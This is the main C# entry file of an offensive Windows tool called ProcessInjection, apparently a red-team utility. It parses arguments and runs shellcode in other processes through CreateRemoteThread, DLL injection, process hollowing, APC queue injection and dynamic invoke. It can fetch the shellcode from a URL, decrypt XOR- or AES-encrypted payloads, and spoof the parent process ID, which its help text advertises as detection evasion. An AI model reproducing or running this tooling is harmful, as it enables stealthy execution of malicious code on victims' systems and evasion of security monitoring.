using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using static ProcessInjection.Native.Win32API;
using static ProcessInjection.Native.Enums;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Constants;
using static ProcessInjection.Utils.Utils;
using static ProcessInjection.Utils.Crypto;
using ProcessInjection.Native;
using static ProcessInjection.PInvoke.CreateRemoteThread;
using static ProcessInjection.PInvoke.DLLInjection;
using static ProcessInjection.PInvoke.ProcessHollowing;
using static ProcessInjection.PInvoke.APCQueue;
using ProcessInjection.PInvoke;
using static ProcessInjection.DInvoke.CreateRemoteThread;

namespace ProcessInjection
{
    public class ProcessInjection
    {       

        public static void logo()
        {
            Console.WriteLine();
            Console.WriteLine("################################################################################################");
            Console.WriteLine("#  ____  ____   ___   ____ _____ ____ ____    ___ _   _     _ _____ ____ _____ ___ ___  _   _  #");
            Console.WriteLine("# |  _ \\|  _ \\ / _ \\ / ___| ____/ ___/ ___|  |_ _| \\ | |   | | ____/ ___|_   _|_ _/ _ \\| \\ | | #");
            Console.WriteLine("# | |_) | |_) | | | | |   |  _| \\___ \\___ \\   | ||  \\| |_  | |  _|| |     | |  | | | | |  \\| | #");
            Console.WriteLine("# |  __/|  _ <| |_| | |___| |___ ___) |__) |  | || |\\  | |_| | |__| |___  | |  | | |_| | |\\  | #");
            Console.WriteLine("# |_|   |_| \\_\\\\___/ \\____|_____|____/____/  |___|_| \\_|\\___/|_____\\____| |_| |___\\___/|_| \\_| #");
            Console.WriteLine("#                                                                                              #");
            Console.WriteLine("################################################################################################");
            Console.WriteLine();

        }

        public static void help()
        {

            string help = @"
*****************Help*****************
[+] The program is designed to perform process injection.
[+] Currently the tool supports 4 process injection techniques.
    1) CreateRemoteThread Injection
    2) DLL Injection
    3) Process Hollowing
    4) APC Queue Injection
    5) Dynamic Invoke - CreateRemoteThread Injection

[+] Supports 3 detection evading techniques.
    1) Parent PID Spoofing
    
    Encryption
    2) XOR Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
    3) AES Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)

[+] The tool accepts shellcode in 4 formats.
    1) base64
    2) hex
    3) c
    4) raw


Usage           Description
-----           -----------
/t              Specify the process injection technique id.
                1 = CreateRemoteThread Injection
                2 = DLL Injection
                3 = Process Hollowing
                4 = APC Queue Injection
                5 = Dynamic Invoke - CreateRemoteThread Injection
/f              Specify the format of the shellcode.
                base64
                hex
                c
                raw
/pid            Specify the process id.
/parentproc     Specify the parent process name.
/path           Specify the path of the file that contains the shellcode.
/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument).
/url            Specify the url where the shellcode is hosted.
/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted.
/key            Specify the key that will be used to decrypt the shellcode.
/sc             Specify the shellcode directly in base64 or hex format. Note: To pass large shellcode please leverage reflection to run the program.  
/help           Show help

";
            Console.WriteLine(help);
        }
        public static void Main(string[] args)
        {
            try
            {
                logo();
                // https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L10

                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
                }
                else
                {
                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
                }

                if (arguments.Count == 0)
                {
                    PrintError("[-] No arguments specified. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.ContainsKey("/help"))
                {
                    help();
                }
                else if (arguments.Count < 3)
                {
                    PrintError("[-] Some arguments are missing. Please refer the help section for more details.");
                    help();
                }
                else if (arguments.Count >= 3)
                {
                    int procid = 0;
                    PPIDSpoofing Parent = new PPIDSpoofing();
                    string ppid = null;
                    int parentProc = 0;
                    string shellcode = null;
                    byte[] rawshellcode = new byte[] { };
                    byte[] dllbuf = new byte[] { };

                    if (arguments.ContainsKey("/pid"))
                    {
                        procid = Convert.ToInt32(arguments["/pid"]);
                        Process process = Process.GetProcessById(procid);
                    }
                    if (arguments.ContainsKey("/parentproc"))
                    {
                        ppid = Convert.ToString(arguments["/parentproc"]);
                        parentProc = Parent.SearchForPPID(ppid);
                    }
                    if (arguments.ContainsKey("/path") && System.IO.File.Exists(arguments["/path"]))
                    {
                        if (arguments["/t"] != "2")
                        {
                            if (arguments["/f"] == "raw")
                            {
                                rawshellcode = System.IO.File.ReadAllBytes(arguments["/path"]);
                            }
                            else
                            {
                                shellcode = System.IO.File.ReadAllText(arguments["/path"]);
                            }
                        }
                        else if (arguments["/t"] == "2")
                        {
                            dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
                        }

                    }
                    else if (arguments.ContainsKey("/url"))
                    {
                        if (arguments["/t"] != "2")
                        {
                            if (arguments["/f"] == "raw")
                            {
                                rawshellcode = GetRawShellcode(arguments["/url"]);
                            }
                            else
                            {
                                shellcode = GetShellcode(arguments["/url"]);
                            }
                        }
                    }
                    else if(arguments.ContainsKey("/sc"))
                    {
                        if(arguments["/f"]== "base64" || arguments["/f"]=="hex")
                        {
                            shellcode = arguments["/sc"];
                        }
                    }
                    if (arguments["/t"] != "2" && (shellcode != null || rawshellcode.Length > 0))
                    {

                        byte[] xorshellcode = new byte[] { };
                        byte[] aesshellcode = new byte[] { };
                        byte[] buf = new byte[] { };

                        if (arguments.ContainsKey("/enc") == true && arguments["/enc"] == "xor")
                        {
                            if (arguments["/f"] == "base64")
                            {
                                xorshellcode = Convert.FromBase64String(shellcode);
                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                xorshellcode = StringToByteArray(shellcode);
                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
                            }
                            else if (arguments["/f"] == "c")
                            {
                                xorshellcode = convertfromc(shellcode);
                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
                            }
                            else if (arguments["/f"] == "raw")
                            {
                                buf = xor(rawshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
                            }
                        }
                        else if (arguments.ContainsKey("/enc") == true && arguments["/enc"] == "aes")
                        {
                            byte[] passwordBytes = Encoding.UTF8.GetBytes(arguments["/key"]);
                            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                            if (arguments["/f"] == "base64")
                            {
                                aesshellcode = Convert.FromBase64String(shellcode);
                                buf = AES_Decrypt(aesshellcode, passwordBytes);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                aesshellcode = StringToByteArray(shellcode);
                                buf = AES_Decrypt(aesshellcode, passwordBytes);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                aesshellcode = convertfromc(shellcode);
                                buf = AES_Decrypt(aesshellcode, passwordBytes);
                            }
                            else if (arguments["/f"] == "raw")
                            {
                                buf = AES_Decrypt(rawshellcode, passwordBytes);
                            }
                        }
                        else
                        {
                            if (arguments["/f"] == "base64")
                            {
                                buf = Convert.FromBase64String(shellcode);
                            }
                            else if (arguments["/f"] == "hex")
                            {
                                buf = StringToByteArray(shellcode);
                            }
                            else if (arguments["/f"] == "c")
                            {
                                buf = convertfromc(shellcode);
                            }
                            else if (arguments["/f"] == "raw")
                            {
                                buf = rawshellcode;
                            }
                        }

                        if (arguments["/t"] == "1")
                        {
                            if (arguments.ContainsKey("/parentproc"))
                            {
                                if (arguments.ContainsKey("/ppath"))
                                {
                                    PrintTitle($"[>>] Parent Process Spoofing with Vanilla Process Injection Technique.");
                                    PPIDCodeInject(arguments["/ppath"], buf, parentProc);
                                }
                                else
                                {
                                    PrintError("[-] /ppath argument is missing");
                                }
                            }
                            else
                            {
                                PrintTitle($"[>>] Vanilla Process Injection Technique.");
                                CodeInject(procid, buf);
                            }
                        }
                        else if (arguments["/t"] == "3")
                        {
                            if (arguments.ContainsKey("/ppath"))
                            {
                                if (arguments.ContainsKey("/parentproc"))
                                {
                                    PrintTitle($"[>>] Parent Process Spoofing with Process Hollowing Technique.");
                                    ProcessHollowing prochollow = new ProcessHollowing();
                                    prochollow.PPIDPProcHollow(arguments["/ppath"], buf, parentProc);
                                }
                                else
                                {
                                    PrintTitle($"[>>] Process Hollowing Injection Technique.");
                                    ProcessHollowing prochollow = new ProcessHollowing();
                                    prochollow.ProcHollow(arguments["/ppath"], buf);
                                }
                            }
                            else
                            {
                                PrintError("[-] /ppath argument is missing");
                            }
                        }
                        else if (arguments["/t"] == "4")
                        {
                            if (arguments.ContainsKey("/ppath"))
                            {
                                if (arguments.ContainsKey("/parentproc"))
                                {
                                    PrintTitle($"[>>] Parent Process Spoofing with APC Queue Injection Technique.");
                                    PPIDAPCInject(arguments["/ppath"], buf, parentProc);
                                }
                                else
                                {
                                    PrintTitle($"[>>] APC Queue Injection Technique.");
                                    PROCESS_INFORMATION processInfo = StartProcess(arguments["/ppath"]);
                                    APCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
                                }
                            }
                            else
                            {
                                PrintError("[-] /ppath argument is missing");
                            }
                        }
                        else if (arguments["/t"] == "5")
                        {
                            if (arguments.ContainsKey("/parentproc"))
                            {
                                if (arguments.ContainsKey("/ppath"))
                                {
                                    PrintTitle($"[>>] Dynamic Invoke - Parent Process Spoofing with Vanilla Process Injection Technique.");
                                    PPIDDynCodeInject(arguments["/ppath"], buf, parentProc);
                                }
                                else
                                {
                                    PrintError("[-] /ppath argument is missing");
                                }
                            }
                            else
                            {
                                PrintTitle($"[>>] Dynamic Invoke - Vanilla Process Injection Technique.");
                                DynamicCodeInject(procid, buf);
                            }
                        }
                    }
                    else if (arguments["/t"] == "2")
                    {
                        if (arguments.ContainsKey("/parentproc"))
                        {
                            if (arguments.ContainsKey("/ppath"))
                            {
                                PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
                                PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
                            }
                            else
                            {
                                PrintError("[-] /ppath argument is missing");
                            }
                        }
                        else
                        {
                            PrintTitle($"[>>] DLL Injection Technique.");
                            DLLInject(procid, dllbuf);
                        }
                    }
                    else
                    {
                        PrintError("[-] Please check the specified file path or the URL.");
                    }
                }
                else
                {
                    PrintError("[-] Invalid argument. Please refer the help section for more details.");
                    help();
                }
            }
            catch (Exception ex)
            {
                PrintError(ex.Message);
            }
        }
    }
}